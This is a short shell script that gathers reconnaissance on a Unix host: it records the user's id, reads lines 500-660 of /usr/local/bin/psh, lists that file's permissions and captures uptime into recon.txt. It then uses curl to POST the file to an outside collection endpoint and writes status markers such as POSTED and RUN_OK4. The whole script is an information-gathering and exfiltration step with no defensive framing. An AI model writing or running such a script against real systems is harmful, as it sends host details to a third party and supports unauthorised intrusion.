#!/bin/sh
cd /udd/z/zxy1715
{
echo "=== id ==="
id
echo "=== psh tail 500-660 ==="
sed -n '500,660p' /usr/local/bin/psh
echo "=== psh file ==="
ls -l /usr/local/bin/psh
echo "=== uptime ==="
uptime
} > recon.txt 2>&1
if [ -x /usr/pkg/bin/curl ]; then
  /usr/pkg/bin/curl -s -X POST -H "Content-Type: text/plain" --data-binary @recon.txt https://sonezhapaas.slew.cloud/collect
  echo POSTED >> deploy_status.txt
else
  echo NOCURL >> deploy_status.txt
fi
echo RUN_OK4 >> deploy_status.txt